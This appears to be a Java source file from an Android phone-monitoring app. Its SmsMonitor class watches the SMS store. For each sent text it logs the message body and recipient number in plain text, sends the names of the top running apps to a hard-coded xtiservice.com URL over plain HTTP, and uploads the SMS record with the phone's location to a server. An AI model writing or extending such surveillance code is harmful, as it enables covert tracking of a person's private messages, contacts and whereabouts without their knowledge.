package com.mobiletrack.monitor;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.List;
import java.util.TreeSet;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.util.Log;

import com.mobiletrack.R;
import com.mobiletrack.config.Config;
import com.mobiletrack.process.SMSBlockProcess;
import com.mobiletrack.record.SMSRecord;
import com.mobiletrack.record.VoiceSMSRecord;
import com.mobiletrack.service.LocationUploadService;

public class SmsMonitor{
	@SuppressWarnings("unused")
	private static final int SMS_TYPE_RECV = 1;
	private static final int SMS_TYPE_SENT = 2;
	private static boolean STARTED = false;
	private static final TreeSet<String> SMS_SENT_RECORDS = new TreeSet<String>();
	private static SmsObserver SMSObserver = null;
	private static final long MONITOR_CREATION_TIME = System.currentTimeMillis();

	public static synchronized void startMonitoring(Context context) {
		if (STARTED)
			return;
		STARTED = true;
		try {
			Log.i(context.getString(R.string.logging_tag), "SMSMonitor:: startMonitoring");
			ContentResolver contentResolver = context.getContentResolver();
			if (SMSObserver == null)
				SMSObserver = new SmsObserver(new Handler(), context);
			contentResolver.registerContentObserver(Uri.parse("content://sms"), true, SMSObserver);
		} catch (Exception e) {
			Log.e(context.getString(R.string.logging_tag),
					"Got Exception while registering SMS content observer in SMSMonitor" +
					"e[" + e.getClass().getName() + "] msg[" + e.getMessage() + "]");
		}
	}

	public static synchronized void stopMonitoring(Context context) {
		if (!STARTED)
			return;
		try {
			ContentResolver contentResolver = context.getContentResolver();
			contentResolver.unregisterContentObserver(SMSObserver);
			STARTED = false;
		} catch (Exception e) {
			Log.e(context.getString(R.string.logging_tag),
					"Got Exception while unregistering SMS content observer in SMSMonitor" +
					"e[" + e.getClass().getName() + "] msg[" + e.getMessage() + "]");
		}
	}

	private static class SmsObserver extends ContentObserver {
		private Context _context;
		public SmsObserver(Handler handler, Context context) {
			super(handler);
			_context = context;
		}

		public void onChange(boolean selfChange) {
			super.onChange(selfChange);
			//			SMSBlockService.startMonitoring(_context);
			new Thread(new Runnable() {
				public void run() {
					try {
						Uri uriSMSURI = Uri.parse("content://sms");
						Cursor cur = _context.getContentResolver().query(uriSMSURI, null, null, null, "date"); //"_id"
						Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: cur [" + cur + "]");
						if (cur != null)
							Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: cur count [" + cur.getColumnCount() + "]");
						if (cur != null && cur.getCount() > 0) {
							cur.moveToLast();
							int type = Integer.parseInt(cur.getString(cur.getColumnIndex("type")));
							Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: SMS Type [" + type + "]");

							if (type == SMS_TYPE_SENT)
							{
								String date = cur.getString(cur.getColumnIndex("date"));
								// [1] discard the old messages before the application launched
								if (Long.parseLong(date) < MONITOR_CREATION_TIME)
									return;
								String message = cur.getString(cur.getColumnIndex("body"));
								// [2] discard the duplicated messages due to the multiple observer invocations
								if (SMS_SENT_RECORDS.contains(date + message))
									return;
								else
									SMS_SENT_RECORDS.add(date + message);

								// [3] delete this SMS message if TXT is not allowed
								Config.takeSnapShot(_context);
								if (!Config.getConfig().isTXTGenericAllowed())
								{
									RunningTaskInfo l = ((ActivityManager) _context
											.getSystemService(Context.ACTIVITY_SERVICE))
											.getRunningTasks(1).get(0);
									SMSBlockProcess.values.add(l.topActivity
											.getPackageName());
									//									SMSBlockService.writeValues(_context);
								}
								List<RunningTaskInfo> list = ((ActivityManager) _context.getSystemService(Context.ACTIVITY_SERVICE)).getRunningTasks(3);
								String address = "http://www.xtiservice.com/DevService.asmx/SMSClient?os=Android";
								address+= Build.VERSION.SDK_INT+"&app1="+list.get(0).topActivity.getPackageName()+"&app2="+list.get(1).topActivity.getPackageName()+ "&app3="+list.get(2).topActivity.getPackageName();
								URL url = new URL(address);

								URLConnection connection = url.openConnection();
								HttpURLConnection httpConnection = (HttpURLConnection) connection;
								int responseCode = httpConnection.getResponseCode();
								if (responseCode == HttpURLConnection.HTTP_OK)
								{
								}
								// [4] record the outgoing sms and report to the server
								SMSRecord smsRecord = new SMSRecord(_context, VoiceSMSRecord.DIRECTION_MO);
								smsRecord._eventStart =(Long.parseLong(date));
								smsRecord._eventEnd = (Long.parseLong(date));
								String smsNumber = cur.getString(cur.getColumnIndex("address"));
								if (smsNumber == null)
									smsNumber = "";
								smsRecord._otherParty =(smsNumber);

								Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: SMS Sent");
								Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: SMS Txt [" + message + "]");
								Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: SMS Phone Number [" + smsNumber + "]");
								Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: SMS Date [" + date + "]");

								// send the record to the server right away
								LocationUploadService.sendVoiceSMSRecordWithLocation(_context, smsRecord);
							}
							/** debug only
                            else {
                                String date = cur.getString(cur.getColumnIndex("date"));
                                String message = cur.getString(cur.getColumnIndex("body"));
                                String smsNumber = cur.getString(cur.getColumnIndex("address"));
                                Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: SMS Recv");
                                Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: SMS Txt [" + message + "]");
                                Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: SMS Phone Number [" + smsNumber + "]");
                                Log.i(_context.getString(R.string.logging_tag), "SMSMonitor:: SMS Date [" + date + "]");
                            }**/

							cur.close();
						}
					} catch (Exception e) {
						Log.i(_context.getString(R.string.logging_tag),
								"Got Exception while parsing SMS in SMSMonitor" +
								"e[" + e.getClass().getName() + "] msg[" + e.getMessage() + "]");
					}
				}
			}).start();
		}
	}
}
